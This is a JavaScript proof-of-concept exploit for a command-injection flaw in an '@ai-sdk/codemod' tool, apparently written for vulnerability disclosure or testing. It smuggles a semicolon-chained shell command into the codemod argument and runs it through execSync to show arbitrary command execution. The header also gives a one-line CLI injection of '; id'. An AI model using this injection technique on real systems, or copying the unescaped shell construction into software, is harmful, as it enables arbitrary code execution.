/**
 * RCE PoC: @ai-sdk/codemod command injection
 *
 * transform() builds a shell command via string concat and passes to execSync.
 * Codemod/source args with ; & | etc. are not escaped -> arbitrary command execution.
 *
 * Run from repo root:
 *   node vulnerabilities/rce-codemod-command-injection/poc.js
 *
 * Best tested on Unix: cd packages/codemod && npx tsx src/bin/codemod.ts "v4/remove-ai; id" .
 */

const { execSync } = require('child_process');
const path = require('path');

// Simulate the vulnerable buildCommand logic
function buildVulnerableCommand(codemod, source) {
  const codemodPath = path.resolve(
    __dirname,
    '../../packages/codemod/src/codemods',
    codemod + '.js'
  );
  const targetPath = path.resolve(source);
  const jscodeshift = 'jscodeshift';
  return `${jscodeshift} -t ${codemodPath} ${targetPath} --parser tsx`;
}

// Injection: semicolon in codemod causes shell to run next command
const maliciousCodemod = 'v4/remove-ai; node -e "require(\\"fs\\").writeFileSync(\\"rce-proof.txt\\",\\"RCE_SUCCESS\\")"';
const source = '.';

console.log('[PoC] Building command with injected codemod:', maliciousCodemod);
const cmd = buildVulnerableCommand(maliciousCodemod, source);
console.log('[PoC] Command:', cmd);
console.log('');

try {
  const result = execSync(cmd, { encoding: 'utf8', timeout: 5000 });
  if (result.includes('RCE_SUCCESS')) {
    console.log('>>> RCE CONFIRMED: Injected command executed');
  }
  console.log(result);
} catch (e) {
  const out = (e.stdout || '') + (e.stderr || '');
  if (require('fs').existsSync(path.join(__dirname, 'rce-proof.txt'))) {
    console.log('>>> RCE CONFIRMED: Injected command wrote rce-proof.txt');
  }
  if (out.includes('RCE_SUCCESS')) {
    console.log('>>> RCE CONFIRMED: Injected command executed');
  }
  console.log(out.slice(-800));
}
